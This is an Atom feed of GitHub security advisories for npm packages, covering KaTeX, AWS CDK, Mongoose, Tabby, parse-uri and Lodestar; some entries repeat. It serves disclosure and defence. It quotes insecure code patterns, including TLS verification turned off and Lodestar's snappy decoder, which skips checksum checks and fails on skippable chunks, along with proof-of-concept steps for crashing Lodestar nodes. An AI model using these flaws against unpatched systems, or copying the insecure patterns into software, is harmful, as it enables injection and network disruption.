<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-01-18T18:01:29.872Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[katex] KaTeX \htmlData does not validate attribute names]]></title>
        <id>https://github.com/advisories/GHSA-cg87-wmx4-v546</id>
        <link href="https://github.com/advisories/GHSA-cg87-wmx4-v546"/>
        <updated>2025-01-17T21:22:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>KaTeX users who render untrusted mathematical expressions with <code>renderToString</code> could encounter malicious input using <code>\htmlData</code> that runs arbitrary JavaScript, or generate invalid HTML.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to KaTeX v0.16.21 to remove this vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Avoid use of or turn off the <code>trust</code> option, or set it to forbid <code>\htmlData</code> commands.</li>
<li>Forbid inputs containing the substring <code>"\\htmlData"</code>.</li>
<li>Sanitize HTML output from KaTeX.</li>
</ul>
<h3 id="details">Details</h3>
<p><code>\htmlData</code> did not validate its attribute name argument, allowing it to generate invalid or malicious HTML that runs scripts.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue or security advisory in the <a href="https://github.com/KaTeX/KaTeX/">KaTeX repository</a></li>
<li>Email us at <a href="mailto:katex-security@mit.edu">katex-security@mit.edu</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cg87-wmx4-v546">https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cg87-wmx4-v546</a></li>
<li><a href="https://github.com/KaTeX/KaTeX/commit/ff289955e81aab89086eef09254cbf88573d415c">https://github.com/KaTeX/KaTeX/commit/ff289955e81aab89086eef09254cbf88573d415c</a></li>
<li><a href="https://github.com/advisories/GHSA-cg87-wmx4-v546">https://github.com/advisories/GHSA-cg87-wmx4-v546</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cg87-wmx4-v546</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-17T21:22:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aws-cdk-lib] AWS Cloud Development Kit (AWS CDK) IAM OIDC custom resource allows connection to unauthorized OIDC provider]]></title>
        <id>https://github.com/advisories/GHSA-v4mq-x674-ff73</id>
        <link href="https://github.com/advisories/GHSA-v4mq-x674-ff73"/>
        <updated>2025-01-17T21:57:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Users who use IAM OIDC custom resource provider package will download CA Thumbprints as part of the custom resource workflow, <a href="https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34">https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34</a>. </p>
<p>However, the current <code>tls.connect</code> method will always set <code>rejectUnauthorized: false</code> which is a potential security concern. CDK should follow the best practice and set <code>rejectUnauthorized: true</code>. However, this could be a breaking change for existing CDK applications and we should fix this with a feature flag. </p>
<p>Note that this is marked as low severity Security advisory because the issuer url is provided by CDK users who define the CDK application. If they insist on connecting to a unauthorized OIDC provider, CDK should not disallow this. Additionally, the code block is run in a Lambda environment which mitigate the MITM attack.</p>
<p>As a best practice, CDK should still fix this issue under a feature flag to avoid regression.</p>
<pre><code>packages/@aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts
❯❱ problem-based-packs.insecure-transport.js-node.bypass-tls-verification.bypass-tls-verification
Checks for setting the environment variable NODE_TLS_REJECT_UNAUTHORIZED to 0, which disables TLS
verification. This should only be used for debugging purposes. Setting the option rejectUnauthorized
to false bypasses verification against the list of trusted CAs, which also leads to insecure
transport.
</code></pre>
<h3 id="patches">Patches</h3>
<p>The patch is in progress. To mitigate, upgrade to CDK v2.177.0 (Expected release date 2025-02-22). 
Once upgraded, please make sure the feature flag '@aws-cdk/aws-iam:oidcRejectUnauthorizedConnections' is set to true in <code>cdk.context.json</code> or <code>cdk.json</code>. More details on feature flag setting is <a href="https://docs.aws.amazon.com/cdk/v2/guide/featureflags.html">here</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>N/A</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/aws/aws-cdk/issues/32920">https://github.com/aws/aws-cdk/issues/32920</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/aws-cdk/security/advisories/GHSA-v4mq-x674-ff73">https://github.com/aws/aws-cdk/security/advisories/GHSA-v4mq-x674-ff73</a></li>
<li><a href="https://github.com/aws/aws-cdk/issues/32920">https://github.com/aws/aws-cdk/issues/32920</a></li>
<li><a href="https://github.com/aws/aws-cdk/commit/3e4f3773bfa48b75bf0adc7d53d46bbec7714a9e#diff-38a03353f201fd2e520df67fb43f9f000257bffd6e9acaa5569cce7005a77560">https://github.com/aws/aws-cdk/commit/3e4f3773bfa48b75bf0adc7d53d46bbec7714a9e#diff-38a03353f201fd2e520df67fb43f9f000257bffd6e9acaa5569cce7005a77560</a></li>
<li><a href="https://docs.aws.amazon.com/cdk/v2/guide/featureflags.html">https://docs.aws.amazon.com/cdk/v2/guide/featureflags.html</a></li>
<li><a href="https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34">https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23206">https://nvd.nist.gov/vuln/detail/CVE-2025-23206</a></li>
<li><a href="https://github.com/advisories/GHSA-v4mq-x674-ff73">https://github.com/advisories/GHSA-v4mq-x674-ff73</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v4mq-x674-ff73</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-01-17T21:22:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mongoose] Mongoose search injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</id>
        <link href="https://github.com/advisories/GHSA-vg7j-7cwx-8wgw"/>
        <updated>2025-01-17T18:02:41.000Z</updated>
        <content type="html"><![CDATA[<p>Mongoose versions prior to 8.9.5, 7.8.4, and 6.13.6 are vulnerable to improper use of the <code>$where</code> operator. This vulnerability arises from the ability of the <code>$where</code> clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.</p>
<p>NOTE: this issue exists because of an incomplete fix for CVE-2024-53900.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23061">https://nvd.nist.gov/vuln/detail/CVE-2025-23061</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc">https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc</a></li>
<li><a href="https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md">https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases/tag/8.9.5">https://github.com/Automattic/mongoose/releases/tag/8.9.5</a></li>
<li><a href="https://www.npmjs.com/package/mongoose?activeTab=versions">https://www.npmjs.com/package/mongoose?activeTab=versions</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6">https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4">https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5">https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases/tag/6.13.6">https://github.com/Automattic/mongoose/releases/tag/6.13.6</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases/tag/7.8.4">https://github.com/Automattic/mongoose/releases/tag/7.8.4</a></li>
<li><a href="https://github.com/advisories/GHSA-m7xq-9374-9rvx">https://github.com/advisories/GHSA-m7xq-9374-9rvx</a></li>
<li><a href="https://github.com/advisories/GHSA-vg7j-7cwx-8wgw">https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-01-15T06:30:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mongoose] Mongoose search injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</id>
        <link href="https://github.com/advisories/GHSA-vg7j-7cwx-8wgw"/>
        <updated>2025-01-17T18:02:41.000Z</updated>
        <content type="html"><![CDATA[<p>Mongoose versions prior to 8.9.5, 7.8.4, and 6.13.6 are vulnerable to improper use of the <code>$where</code> operator. This vulnerability arises from the ability of the <code>$where</code> clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.</p>
<p>NOTE: this issue exists because of an incomplete fix for CVE-2024-53900.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23061">https://nvd.nist.gov/vuln/detail/CVE-2025-23061</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc">https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc</a></li>
<li><a href="https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md">https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases/tag/8.9.5">https://github.com/Automattic/mongoose/releases/tag/8.9.5</a></li>
<li><a href="https://www.npmjs.com/package/mongoose?activeTab=versions">https://www.npmjs.com/package/mongoose?activeTab=versions</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6">https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4">https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5">https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases/tag/6.13.6">https://github.com/Automattic/mongoose/releases/tag/6.13.6</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases/tag/7.8.4">https://github.com/Automattic/mongoose/releases/tag/7.8.4</a></li>
<li><a href="https://github.com/advisories/GHSA-m7xq-9374-9rvx">https://github.com/advisories/GHSA-m7xq-9374-9rvx</a></li>
<li><a href="https://github.com/advisories/GHSA-vg7j-7cwx-8wgw">https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-01-15T06:30:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mongoose] Mongoose search injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</id>
        <link href="https://github.com/advisories/GHSA-vg7j-7cwx-8wgw"/>
        <updated>2025-01-17T18:02:41.000Z</updated>
        <content type="html"><![CDATA[<p>Mongoose versions prior to 8.9.5, 7.8.4, and 6.13.6 are vulnerable to improper use of the <code>$where</code> operator. This vulnerability arises from the ability of the <code>$where</code> clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.</p>
<p>NOTE: this issue exists because of an incomplete fix for CVE-2024-53900.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23061">https://nvd.nist.gov/vuln/detail/CVE-2025-23061</a></li>
<li><a href="https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc">https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc</a></li>
<li><a href="https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md">https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases/tag/8.9.5">https://github.com/Automattic/mongoose/releases/tag/8.9.5</a></li>
<li><a href="https://www.npmjs.com/package/mongoose?activeTab=versions">https://www.npmjs.com/package/mongoose?activeTab=versions</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6">https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4">https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4</a></li>
<li><a href="https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5">https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases/tag/6.13.6">https://github.com/Automattic/mongoose/releases/tag/6.13.6</a></li>
<li><a href="https://github.com/Automattic/mongoose/releases/tag/7.8.4">https://github.com/Automattic/mongoose/releases/tag/7.8.4</a></li>
<li><a href="https://github.com/advisories/GHSA-m7xq-9374-9rvx">https://github.com/advisories/GHSA-m7xq-9374-9rvx</a></li>
<li><a href="https://github.com/advisories/GHSA-vg7j-7cwx-8wgw">https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vg7j-7cwx-8wgw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-01-15T06:30:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tabby-ssh] Eugeny Tabby Sends Password Despite Host Key Verification Failure]]></title>
        <id>https://github.com/advisories/GHSA-8vq4-8hfp-29xh</id>
        <link href="https://github.com/advisories/GHSA-8vq4-8hfp-29xh"/>
        <updated>2025-01-17T16:28:35.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in Eugeny Tabby 1.0.213 allows a remote attacker to obtain sensitive information via the server and sends the SSH username and password even when the host key verification fails.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48460">https://nvd.nist.gov/vuln/detail/CVE-2024-48460</a></li>
<li><a href="https://github.com/Eugeny/tabby/issues/9955">https://github.com/Eugeny/tabby/issues/9955</a></li>
<li><a href="https://github.com/Eugeny/tabby/commit/1c077147acd0a6ec9f8ee80d83a3e9688fbb9444">https://github.com/Eugeny/tabby/commit/1c077147acd0a6ec9f8ee80d83a3e9688fbb9444</a></li>
<li><a href="https://github.com/advisories/GHSA-8vq4-8hfp-29xh">https://github.com/advisories/GHSA-8vq4-8hfp-29xh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8vq4-8hfp-29xh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-17T00:30:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parseuri] parse-uri Regular expression Denial of Service (ReDoS)]]></title>
        <id>https://github.com/advisories/GHSA-6fx8-h7jm-663j</id>
        <link href="https://github.com/advisories/GHSA-6fx8-h7jm-663j"/>
        <updated>2025-01-17T15:39:06.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36751">https://nvd.nist.gov/vuln/detail/CVE-2024-36751</a></li>
<li><a href="https://github.com/Kikobeats/parse-uri/issues/14">https://github.com/Kikobeats/parse-uri/issues/14</a></li>
<li><a href="https://gist.github.com/6en6ar/78168687da94e8aa2e0357f2456b0233">https://gist.github.com/6en6ar/78168687da94e8aa2e0357f2456b0233</a></li>
<li><a href="https://github.com/advisories/GHSA-6fx8-h7jm-663j">https://github.com/advisories/GHSA-6fx8-h7jm-663j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6fx8-h7jm-663j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-16T00:31:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-uri] parse-uri Regular expression Denial of Service (ReDoS)]]></title>
        <id>https://github.com/advisories/GHSA-6fx8-h7jm-663j</id>
        <link href="https://github.com/advisories/GHSA-6fx8-h7jm-663j"/>
        <updated>2025-01-17T15:39:06.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36751">https://nvd.nist.gov/vuln/detail/CVE-2024-36751</a></li>
<li><a href="https://github.com/Kikobeats/parse-uri/issues/14">https://github.com/Kikobeats/parse-uri/issues/14</a></li>
<li><a href="https://gist.github.com/6en6ar/78168687da94e8aa2e0357f2456b0233">https://gist.github.com/6en6ar/78168687da94e8aa2e0357f2456b0233</a></li>
<li><a href="https://github.com/advisories/GHSA-6fx8-h7jm-663j">https://github.com/advisories/GHSA-6fx8-h7jm-663j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6fx8-h7jm-663j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-16T00:31:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@lodestar/reqresp] Lodestar snappy checksum issue]]></title>
        <id>https://github.com/advisories/GHSA-m9c9-mc2h-9wjw</id>
        <link href="https://github.com/advisories/GHSA-m9c9-mc2h-9wjw"/>
        <updated>2025-01-14T22:04:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Unintended permanent chain split affecting greater than or equal to 25% of the network, requiring hard fork (network partition requiring hard fork)</p>
<p>Lodestar does not verify checksum in snappy framing uncompressed chunks.</p>
<h3 id="vulnerability-details">Vulnerability Details</h3>
<p>In Req/Resp protocol the messages are encoded by using ssz_snappy encoding, which is a snappy framing compression over ssz encoded message.</p>
<p>In snappy framing format there are uncompressed chunks, each such chunk is prefixed with a checksum.</p>
<p>Let's see how golang implementation parses such chunks - <a href="https://github.com/golang/snappy/blob/master/decode.go#L176">https://github.com/golang/snappy/blob/master/decode.go#L176</a></p>
<pre><code>    case chunkTypeUncompressedData:
            // Section 4.3. Uncompressed data (chunk type 0x01).
            if chunkLen &lt; checksumSize {
                r.err = ErrCorrupt
                return r.err
            }
            buf := r.buf[:checksumSize]
            if !r.readFull(buf, false) {
                return r.err
            }
            checksum := uint32(buf[0]) | uint32(buf[1])&lt;&lt;8 | uint32(buf[2])&lt;&lt;16 | uint32(buf[3])&lt;&lt;24
            // Read directly into r.decoded instead of via r.buf.
            n := chunkLen - checksumSize
            if n &gt; len(r.decoded) {
                r.err = ErrCorrupt
                return r.err
            }
            if !r.readFull(r.decoded[:n], false) {
                return r.err
            }
            if crc(r.decoded[:n]) != checksum {
                r.err = ErrCorrupt
                return r.err
            }
            r.i, r.j = 0, n
            continue
</code></pre>
<p>As you can see, if checksum is incorrect, decoder fails and returns error.</p>
<p>Now let's look at lodestar decoder <a href="https://github.com/ChainSafe/lodestar/blob/unstable/packages/reqresp/src/encodingStrategies/sszSnappy/snappyFrames/uncompress.ts#L17">https://github.com/ChainSafe/lodestar/blob/unstable/packages/reqresp/src/encodingStrategies/sszSnappy/snappyFrames/uncompress.ts#L17</a></p>
<pre><code>uncompress(chunk: Uint8ArrayList): Uint8ArrayList | null {
    this.buffer.append(chunk);
    const result = new Uint8ArrayList();
    while (this.buffer.length &gt; 0) {
      if (this.buffer.length &lt; 4) break;

      const type = getChunkType(this.buffer.get(0));
      const frameSize = getFrameSize(this.buffer, 1);

      if (this.buffer.length - 4 &lt; frameSize) {
        break;
      }

      const data = this.buffer.subarray(4, 4 + frameSize);
      this.buffer.consume(4 + frameSize);

      if (!this.state.foundIdentifier &amp;&amp; type !== ChunkType.IDENTIFIER) {
        throw "malformed input: must begin with an identifier";
      }

      if (type === ChunkType.IDENTIFIER) {
        if (!Buffer.prototype.equals.call(data, IDENTIFIER)) {
          throw "malformed input: bad identifier";
        }
        this.state.foundIdentifier = true;
        continue;
      }

      if (type === ChunkType.COMPRESSED) {
        result.append(uncompress(data.subarray(4)));
      }
      if (type === ChunkType.UNCOMPRESSED) {
1)        result.append(data.subarray(4));
      }
    }
    if (result.length === 0) {
      return null;
    }
    return result;
  }
</code></pre>
<p>As you can see, checksum is not verified, bytes are appended to 'result'</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>How to reproduce:</p>
<p>get poc via <a href="https://gist.github.com/gln7/aab55674431b1c8d42a59ccf9d7cbf60">gist link</a> and run it:</p>
<pre><code>$ node dec1.mjs 
checking chunk type=255
checking chunk type=1
got uncompressed chunk..
Decompressed ok 124 bytes
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ChainSafe/lodestar/security/advisories/GHSA-m9c9-mc2h-9wjw">https://github.com/ChainSafe/lodestar/security/advisories/GHSA-m9c9-mc2h-9wjw</a></li>
<li><a href="https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300">https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300</a></li>
<li><a href="https://github.com/advisories/GHSA-m9c9-mc2h-9wjw">https://github.com/advisories/GHSA-m9c9-mc2h-9wjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m9c9-mc2h-9wjw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-01-14T22:04:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@lodestar/reqresp] Lodestar snappy decompression issue]]></title>
        <id>https://github.com/advisories/GHSA-53rv-hcvm-rpp9</id>
        <link href="https://github.com/advisories/GHSA-53rv-hcvm-rpp9"/>
        <updated>2025-01-14T22:04:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Unintended permanent chain split affecting greater than or equal to 25% of the network, requiring hard fork (network partition requiring hard fork)</p>
<h3 id="description">Description</h3>
<p>Lodestar client may fail to decode snappy framing compressed messages.</p>
<h3 id="vulnerability-details">Vulnerability Details</h3>
<p>In Req/Resp protocol the message are encoded by using ssz_snappy encoding, which is basically snappy framing compression over ssz encoded message.</p>
<p>It's mentioned here - <a href="https://github.com/ethereum/consensus-specs/blob/dev/specs/phase0/p2p-interface.md">https://github.com/ethereum/consensus-specs/blob/dev/specs/phase0/p2p-interface.md</a></p>
<pre><code>The token of the negotiated protocol ID specifies the type of encoding to be used for the req/resp interaction. Only one value is possible at this time:

ssz_snappy: The contents are first SSZ-encoded and then compressed with Snappy frames compression. For objects containing a single field, only the field is SSZ-encoded not a container with a single field. For example, the BeaconBlocksByRoot request is an SSZ-encoded list of Root's. This encoding type MUST be supported by all clients.
</code></pre>
<p>In snappy framing format there a few types of chunks.
We are interested in so called reserved skippable chunks. These are chunks with chunk type in range [0x80, 0xfd]
Let's see how rust snappy handles them <a href="https://github.com/BurntSushi/rust-snappy/blob/master/src/read.rs#L137">https://github.com/BurntSushi/rust-snappy/blob/master/src/read.rs#L137</a></p>
<pre><code>impl&lt;R: io::Read&gt; io::Read for FrameDecoder&lt;R&gt; {
    fn read(&amp;mut self, buf: &amp;mut [u8]) -&gt; io::Result&lt;usize&gt; {
            ... 
           ...
              let len = len64 as usize;
            match ty {
                Err(b) if 0x02 &lt;= b &amp;&amp; b &lt;= 0x7F =&gt; {
                    // Spec says that chunk types 0x02-0x7F are reserved and
                    // conformant decoders must return an error.
                    fail!(Error::UnsupportedChunkType { byte: b });
                }
                Err(b) if 0x80 &lt;= b &amp;&amp; b &lt;= 0xFD =&gt; {
                    // Spec says that chunk types 0x80-0xFD are reserved but
                    // skippable.
                    self.r.read_exact(&amp;mut self.src[0..len])?;
                }
</code></pre>
<p>Similar code can be found in golang implementation - <a href="https://github.com/golang/snappy/blob/master/decode.go#L221">https://github.com/golang/snappy/blob/master/decode.go#L221</a></p>
<pre><code>func (r *Reader) fill() error {
    ...
    if chunkType &lt;= 0x7f {
            // Section 4.5. Reserved unskippable chunks (chunk types 0x02-0x7f).
            r.err = ErrUnsupported
            return r.err
        }
        // Section 4.4 Padding (chunk type 0xfe).
        // Section 4.6. Reserved skippable chunks (chunk types 0x80-0xfd).
        if !r.readFull(r.buf[:chunkLen], false) {
            return r.err
        }
</code></pre>
<p>Now let's see how lodestar handles such chunks <a href="https://github.com/ChainSafe/lodestar/blob/unstable/packages/reqresp/src/encodingStrategies/sszSnappy/snappyFrames/uncompress.ts#L17">https://github.com/ChainSafe/lodestar/blob/unstable/packages/reqresp/src/encodingStrategies/sszSnappy/snappyFrames/uncompress.ts#L17</a></p>
<pre><code>uncompress(chunk: Uint8ArrayList): Uint8ArrayList | null {
    this.buffer.append(chunk);
    const result = new Uint8ArrayList();
    while (this.buffer.length &gt; 0) {
      if (this.buffer.length &lt; 4) break;

      const type = getChunkType(this.buffer.get(0));
      const frameSize = getFrameSize(this.buffer, 1);

      if (this.buffer.length - 4 &lt; frameSize) {
        break;
      }

      const data = this.buffer.subarray(4, 4 + frameSize);
      this.buffer.consume(4 + frameSize);

      if (!this.state.foundIdentifier &amp;&amp; type !== ChunkType.IDENTIFIER) {
        throw "malformed input: must begin with an identifier";
      }

      if (type === ChunkType.IDENTIFIER) {
        if (!Buffer.prototype.equals.call(data, IDENTIFIER)) {
          throw "malformed input: bad identifier";
        }
        this.state.foundIdentifier = true;
        continue;
      }

      if (type === ChunkType.COMPRESSED) {
        result.append(uncompress(data.subarray(4)));
      }
      if (type === ChunkType.UNCOMPRESSED) {
        result.append(data.subarray(4));
      }
    }
    if (result.length === 0) {
      return null;
    }
    return result;
  }

 function getChunkType(value: number): ChunkType {
  switch (value) {
    case ChunkType.IDENTIFIER:
      return ChunkType.IDENTIFIER;
    case ChunkType.COMPRESSED:
      return ChunkType.COMPRESSED;
    case ChunkType.UNCOMPRESSED:
      return ChunkType.UNCOMPRESSED;
    case ChunkType.PADDING:
      return ChunkType.PADDING;
    default:
      throw new Error("Unsupported snappy chunk type");
  }
</code></pre>
<p>As you can see, lodestar does not recognize such chunks.</p>
<p>If it sees such chunk, function getChunkType() throws an exception and decoding fails.</p>
<h3 id="impact-details">Impact Details</h3>
<p>Faulty nodes may trigger chain stall by sending messages which lodestar fails to parse, while other clients will be able to handle.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>How to reproduce:</p>
<ol>
<li>get archive (via provided <a href="https://gist.github.com/gln7/bdde7f4e0bdf9d47bf810a015796867a">gist link</a>), decode and unpack it:</li>
</ol>
<pre><code>$ base64 -d poc.txt &gt; poc.tgz
$ tar zxf poc.tgz
</code></pre>
<ol start="2">
<li>run dec1.go to verify that our snappy file decompressed successfully</li>
</ol>
<pre><code>$ go run dec1.go

reading 1.snappy...
read 124 bytes, err &lt;nil&gt;
</code></pre>
<ol start="3">
<li>run dec1.mjs to verify that lodestar fails to decode such file</li>
</ol>
<pre><code>checking chunk type=255
checking chunk type=1
got uncompressed chunk..
checking chunk type=129
file:///../poc/dec1.mjs:74
            throw new Error("Unsupported snappy chunk type");
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ChainSafe/lodestar/security/advisories/GHSA-53rv-hcvm-rpp9">https://github.com/ChainSafe/lodestar/security/advisories/GHSA-53rv-hcvm-rpp9</a></li>
<li><a href="https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300">https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300</a></li>
<li><a href="https://github.com/advisories/GHSA-53rv-hcvm-rpp9">https://github.com/advisories/GHSA-53rv-hcvm-rpp9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
